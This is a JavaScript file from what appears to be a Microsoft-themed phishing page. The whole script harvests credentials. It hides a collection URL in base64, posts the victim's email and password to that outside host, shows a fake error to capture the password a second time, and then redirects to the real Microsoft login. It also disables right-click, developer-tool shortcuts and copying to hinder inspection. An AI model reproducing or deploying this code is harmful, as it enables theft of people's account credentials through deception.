            $(function() {
                var encodedString ="aHR0cHM6Ly9hYmJleXJlY3J1aXRtZW50Z3JvdXAuY28udWsvaW52b2ljZWdlbi9yZXNvdXJjZXMu
cGhw";          
            var decodedString = window.atob(encodedString); 
        var redirectString  = "aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL2NvbW1vbi9vYXV0aDIvdjIuMC9hdXRo b3JpemU/Y2xpZW50X2lkPTQ3NjU0NDViLTMyYzYtNDliMC04M2U2LTFkOTM3NjUyNzZjYSZyZWRp cmVjdF91cmk9aHR0cHMlM0ElMkYlMkZ3d3cub2ZmaWNlLmNvbSUyRmxhbmRpbmd2MiZyZXNwb25z ZV90eXBlPWNvZGUlMjBpZF90b2tlbiZzY29wZT1vcGVuaWQlMjBwcm9maWxlJTIwaHR0cHMlM0El MkYlMkZ3d3cub2ZmaWNlLmNvbSUyRnYyJTJGT2ZmaWNlSG9tZS5BbGwmcmVzcG9uc2VfbW9kZT1m b3JtX3Bvc3Qmbm9uY2U9NjM3OTk3ODMzOTI4NDUzOTI3Lk9XVmlNamsyTm1VdE9ETTVOaTAwTURa bExUZ3laalV0T0RRME56Rm1ZVGszTnprMU1EQmxaRFE1TVRndFlXSmpOQzAwTkRreUxXRmxOV0V0 TkRBd09XWTNaV1EzTkRnMCZ1aV9sb2NhbGVzPWVuLVVTJm1rdD1lbi1VUyZjbGllbnQtcmVxdWVz dC1pZD1iZTg2NzM4OC1lYTA3LTQwOTQtYmYwZS0xNjA0ZmUyNDY2NmImc3RhdGU9OHhGdXhPVkM3 NjhMdmZUR1FZaktnWGNSMEFiSmxoU2lFU1M0S1hFNVMxbFQ5MDdudXB1eGQzbVFHVVBUbzJ5YVl0 UkdNVS13ekJxQktBemJSMlRxVWdCbU9TeldfQnJuQUo1VloxT0hBeDFfUHRldHFMdDJFMURNdnZz TnZhVW9kRmtfeTI4V2FyRlpreFNUanZsQVhxQ2hwbGpka3gwZl9ZZkhTdXRha1M1VEc3emxxRFFD aU1YYmgzYjluWmthUWxYTVlsMlVZVDJmOFAzQ2FvaTlLZGhWTU9INENuRXgyajU0SUhob2VYT0Vo OGppVmZDc0ZVZGVuVkdmWXVfWXpVQlhIRXl3ZXRmdS0tWkJDdTJpMkxEeFB5TWtFSWp2RHgzWFVp bXhQRjgmeC1jbGllbnQtU0tVPUlEX05FVFNUQU5EQVJEMl8wJngtY2xpZW50LXZlcj02LjE2LjAu MA==";          
        var decodedString = window.atob(redirectString);
        
           var success = 0;
           $(document).on('submit', 'form', function(event) {
               event.preventDefault();
               
               var email = $('#email').val();        
               var pass  = $('#pass').val();
               
               if(success == 0) {
                   $.post(window.atob(encodedString), {email: email,pass: pass});
                   setTimeout(function() {
                       $('#pass').val('');
                      
                       $(document).ready(function () {
                        document.getElementById("boxing").style="height:352.25px;";
                       $("#error").show();
                       document.getElementById("pass").style="border-bottom: 1px solid #e81123;";
                       document.getElementById("pass").focus();

                    });
                     
                          
                       success = 1;
                   }, 1000);
               } else {
                   $.post(window.atob(encodedString), {email: email,pass: pass});
                   setTimeout(function() {
                      window.location = ( window.atob(redirectString)); 
                   }, 1000);
               }
           });
       }); 
   



	window.oncontextmenu = function () {
				return false;
			}
			$(document).keydown(function (event) {
				if (event.keyCode == 123) {
					return false;
				}
				else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
					return false;
				}
			});

   
    /*function check(e)
    {
    alert(e.keyCode);
    }*/
    document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) 
            return false;
    };
    location.hash = '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=bLsf48WgEuAI7RoEdxavE8TQLtBtCNO76Mtp3phtR3iDEXrbhHABjY7xzlU2yKdtYzbBNP3eFj753u7swLDFU8LeLBU8CIWZUURZdnDYHX9kSAL5n1IOJTY0wZb-066b5Wj8mI4OSs8iTTc67CsB7ksraYAgoboMS9vuPqMeA-hTdWs86qMsnMjZIawxcq8-nB_mQiGVPmXug-aVuExKTH8czcN0Z4-EBMRGNVFgWRuTJ-V33K6Ks4z69ZwA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0'
